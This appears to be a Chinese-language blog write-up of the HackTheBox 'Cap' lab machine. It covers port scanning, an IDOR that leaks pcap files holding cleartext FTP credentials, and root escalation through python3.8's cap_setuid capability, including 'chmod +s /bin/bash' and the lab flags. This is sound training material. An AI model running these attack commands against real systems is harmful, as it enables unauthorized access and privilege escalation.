{"pageProps":{"postData":{"id":"HackTheBoxMachine - Cap","contentHtml":"<h1>Machine - Cap</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Cap\">https://app.hackthebox.com/machines/Cap</a> | <code>Linux</code> | <code>Easy</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image.png\" alt=\"image.png\"></p>\n<p>大名鼎鼎的<code>Cap</code>，新手关</p>\n<h2>Recon</h2>\n<p><code>nmap</code>端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Cap nmap -sT -min-rate 5000 10.10.10.245    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.10.245\nHost is up (0.072s latency).\nNot shown: 701 closed tcp ports (conn-refused), 296 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.81 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.10.245\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n80/tcp open  http    Gunicorn\n|_http-title: Security Dashboard\n|_http-server-header: gunicorn\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   110.57 ms 10.10.16.1\n2   55.69 ms  10.10.10.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 15.50 seconds\n</code></pre>\n<p>有<code>FTP</code>服务的存在，我们首先枚举<code>FTP</code> ，但是并不支持匿名用户访问</p>\n<pre><code class=\"hljs language-bash\">➜  Cap ftp 10.10.10.245\nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n</code></pre>\n<p>访问 <code>HTTP</code> ，一个后台管理的模板</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image1.png\" alt=\"image.png\"></p>\n<p>有一些很有趣的功能</p>\n<p>在 <code>/data/3</code> 中能下载一个 <code>pcap</code>文件</p>\n<p><code>/ip</code> 能看到<code>ip add</code> 命令执行的结果</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image2.png\" alt=\"image.png\"></p>\n<p><code>/netstat</code> 中能发现端口和进程信息</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image3.png\" alt=\"image.png\"></p>\n<p>发现了一个有趣的点 <code>/data/x</code> 是会增加的，能观察到最大是到<code>9</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image4.png\" alt=\"image.png\"></p>\n<h2>IDOR - 不安全的直接对象引用</h2>\n<p>下载的<code>pcap</code>文件貌似是一段时间内通过的流量，我们一直<code>ping</code> ，等待它更新，更新后我们将<code>pcap</code>文件下载下来打开，能确定就是它捕获的流量</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image5.png\" alt=\"image.png\"></p>\n<p>可以尝试一直下载 <code>pcap</code> 文件，捕捉下载时的流量</p>\n<pre><code class=\"hljs language-bash\">➜  Cap <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> {0..9};<span class=\"hljs-keyword\">do</span> curl 10.10.10.245/download/<span class=\"hljs-variable\">${i}</span> --output <span class=\"hljs-variable\">${i}</span>.pcap;<span class=\"hljs-built_in\">sleep</span> 1;<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image6.png\" alt=\"image.png\"></p>\n<p>当我们分析到<code>0.pcap</code>文件的时候，能发现捕捉到了<code>FTP</code>的包，这在其他<code>>1.pacp</code>的数据包中是没有的</p>\n<p>所以这里出现了应用逻辑上的错误，敏感信息泄露 (Sensitive Information Disclosure)，不安全的直接对象引用 (Insecure Direct Object Reference - IDOR)</p>\n<p>并且后端代码中可能是：</p>\n<pre><code class=\"hljs language-bash\">def download_file(i):\n    <span class=\"hljs-comment\"># 当 i=0 时，有一个特殊处理，可能用于调试或测试</span>\n    <span class=\"hljs-keyword\">if</span> i == 0:\n        file_path = <span class=\"hljs-string\">\"/var/log/debug/ftp_capture.pcap\"</span> <span class=\"hljs-comment\"># 指向了一个开发/运维人员留下的调试文件</span>\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-comment\"># 正常逻辑</span>\n        file_path = f<span class=\"hljs-string\">\"/var/www/downloads/file_{i}.data\"</span>\n    <span class=\"hljs-comment\"># 检查文件是否存在并返回给用户</span>\n    <span class=\"hljs-keyword\">if</span> file_exists(file_path):\n        <span class=\"hljs-built_in\">return</span> send_file(file_path)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">\"File not found\"</span>\n</code></pre>\n<p>然后我们得到了它</p>\n<p>并且<code>FTP</code>数据包中带有<code>nathan</code>用户的凭据，<code>nathan:Buck3tH4TF0RM3!</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image7.png\" alt=\"image.png\"></p>\n<p>凭据可以进去到 <code>FTP</code></p>\n<pre><code class=\"hljs language-bash\">➜  Cap ftp 10.10.10.245                                                                  \nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): nathan\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system <span class=\"hljs-built_in\">type</span> is UNIX.\nUsing binary mode to transfer files.\nftp> <span class=\"hljs-built_in\">dir</span>\n229 Entering Extended Passive Mode (|||24592|)\n150 Here comes the directory listing.\n-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html\ndrwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap\n-r--------    1 1001     1001           33 Jun 10 19:39 user.txt\n226 Directory send OK.\n</code></pre>\n<p>也可以进行 <code>SSH</code> 登录</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image8.png\" alt=\"image.png\"></p>\n<p>当前家目录下可以读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">nathan@<span class=\"hljs-built_in\">cap</span>:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nc5a3b7e60be43d07acb3580714228ee7\n</code></pre>\n<h2>权限提升</h2>\n<p>运行<code>Web</code>的<code>app.py</code> 里面的信息很有趣，<code>setuid(0)</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Cap/image9.png\" alt=\"image.png\"></p>\n<p>但是我们可以注意到是以<code>nathan</code>权限运行的，那么<code>setuid(0)</code> 要怎么才能有效呢？</p>\n<pre><code class=\"hljs language-bash\">nathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 32\ndrwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .\ndrwxr-xr-x 3 root   root   4096 May 23  2021 ..\ndrwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__\n-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py\ndrwxr-xr-x 6 root   root   4096 May 23  2021 static\ndrwxr-xr-x 2 root   root   4096 May 23  2021 templates\ndrwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload\n</code></pre>\n<p>我们直接运行<code>python</code> ，直接就能拿到 <code>root</code> 权限了</p>\n<pre><code class=\"hljs language-bash\">nathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ python3\npython3           python3-config    python3.8         python3.8-config  \nnathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ python3.8\nPython 3.8.5 (default, Jan 27 2021, 15:41:15) \n[GCC 9.3.0] on linux\nType <span class=\"hljs-string\">\"help\"</span>, <span class=\"hljs-string\">\"copyright\"</span>, <span class=\"hljs-string\">\"credits\"</span> or <span class=\"hljs-string\">\"license\"</span> <span class=\"hljs-keyword\">for</span> more information.\n>>> import os;os.setuid(0)\n>>> os.system(<span class=\"hljs-built_in\">id</span>)\nTraceback (most recent call last):\n  File <span class=\"hljs-string\">\"&#x3C;stdin>\"</span>, line 1, <span class=\"hljs-keyword\">in</span> &#x3C;module>\nTypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method\n>>> os.system(<span class=\"hljs-string\">'id'</span>)\nuid=0(root) gid=1001(nathan) <span class=\"hljs-built_in\">groups</span>=1001(nathan)\n0\n>>> os.system(<span class=\"hljs-string\">'chmod +s /bin/bash'</span>)\n0\n</code></pre>\n<pre><code class=\"hljs language-bash\">bash-5.0# <span class=\"hljs-built_in\">cat</span> root.txt \n6b21801e0d9e7354cfa2de802cf89dcd\n</code></pre>\n<p>通过 <code>getcap</code> 命令也能知道为什么会有该权限</p>\n<pre><code class=\"hljs language-bash\">nathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ <span class=\"hljs-built_in\">which</span> python3\n/usr/bin/python3\nnathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ <span class=\"hljs-built_in\">which</span> python3.8\n/usr/bin/python3.8\nnathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ <span class=\"hljs-built_in\">getcap</span> /usr/bin/python3\nnathan@<span class=\"hljs-built_in\">cap</span>:/var/www/html$ <span class=\"hljs-built_in\">getcap</span> /usr/bin/python3.8\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n</code></pre>","title":"HackTheBox - Machine - Cap","date":"2025-06-11","updated":"2025-06-11","tags":["HackTheBox","Linux","Capabilities","IDOR"],"categories":"靶机","comments":true,"description":"Machine - Cap\n\n https://app.hackthebox.com/machines/Cap | `Linux` | `Easy`\n \n\n\n\n大名鼎鼎的`Cap`，新手关\n\nRecon\n\n`nmap`端口扫描\n\n\n\n\n\n有`FTP`服务的存在，我们首先枚举`FTP` ，但是并不支持匿名用户访问\n\n\n\n访问 `HTTP` ，一个后台管理的模板\n\n\n\n有一些很有趣的功能\n\n在 `/d..."},"recentPosts":[{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"}]},"__N_SSG":true}